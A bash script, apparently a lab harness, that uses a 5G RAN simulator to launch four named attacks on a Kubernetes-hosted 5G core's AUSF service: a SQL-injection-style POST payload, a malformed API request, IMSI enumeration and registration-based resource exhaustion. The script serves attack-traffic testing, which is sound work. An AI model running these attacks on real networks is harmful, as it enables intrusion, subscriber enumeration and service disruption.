#!/bin/bash
set -e

cd "$(dirname "$0")"
SVC="f5gc-ausf"
NS="f5gc"
SRC_IP="60.60.0.14"
SVC_IP=`kubectl get -n $NS svc/$SVC -o jsonpath="{['spec']['clusterIP']}"`
SVC_PORT=`kubectl get -n f5gc svc/f5gc-ausf -o jsonpath="{.spec.ports[0].port}"`
select="select '*' from user_table"
DATASQL='{"supiOrSuci":"suci-0-208-93-1234-0-0-0000000003","servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org","attack":"'$select'"}'
DATAAPI='{"supiOrSuci":"suci-0-208-93-1234-0-0-0000000003","servingNetworkName":"5G:mnc093.mcc208.3gppnetwork.org"}'
IMSI=208930000000004


# - attack list
ATTACK_POOL="sql|api|imsiCracking|rsExhaustion"
if [[ ! "$1" =~ $ATTACK_POOL ]]
then
    echo "Usage: $0 [ ${ATTACK_POOL//|/ | } ]"
    exit 1
fi

function create_nr_agent()
{
    ./nr-agent > /dev/null 2>&1 &
    NRPID=$!
    sleep 2
    JPID=$(pgrep -P $NRPID)
}

function terminate()
{
    kill -9 $JPID 2>/dev/null
    sleep 2
}
function create_gNB()
{
    ./nr-cli gnb-create
    sleep 1
}
function create_ue()
{
    echo $IMSI
    ./nr-cli ue-create --imsi=$IMSI
    sleep 4
}
function create_session()
{
    echo $IMSI
    ./nr-cli session-create $IMSI
    sleep 4
}
function deregister_ue()
{
    echo $IMSI
    ./nr-cli ue-deregister $IMSI
    sleep 1
}

case "$1" in
  sql)
    create_nr_agent
    echo "sql attack process $NRPID and $JPID `date +%d-%m-%H:%M`"
    create_gNB
    create_ue
    create_session
    response=`curl -s --interface uesimtun0  -i --request POST  http://$SVC_IP:$SVC_PORT/nausf-auth/v1/ue-authentications --header 'Content-Type: application/json' --data-raw "$DATASQL"`
    echo $response
    terminate
    ;;

  api)
    create_nr_agent
    echo "api attack process $NRPID and $JPID `date +%d-%m-%H:%M`"
    create_gNB
    create_ue
    create_session
    response=`curl -s --interface uesimtun0 -i --request GET  http://$SVC_IP:$SVC_PORT/nausf-auth/v1/ue-authentications --header 'Content-Type: application/json' --data-raw "$DATAAPI"`
    echo $response
    terminate
    ;;

  rsExhaustion)
    for i in {1..5}
    do
        create_nr_agent
        echo "rsExhaustion num:$i process $NRPID and $JPID `date +%d-%m-%H:%M`"
        create_gNB
        create_ue
        deregister_ue
        terminate
    done
    ;;
  imsiCracking)
    create_nr_agent
    create_gNB
    for i in {1..5}
    do
        echo "imsiCracking num:$i process $NRPID and $JPID `date +%d-%m-%H:%M`"
        IMSI=$(($IMSI+$i))
        create_ue
    done
    terminate
    ;;

  *)
    echo "Usage: $0 [ ${ATTACK_POOL//|/ | } ]"
    exit 1
    ;;
esac



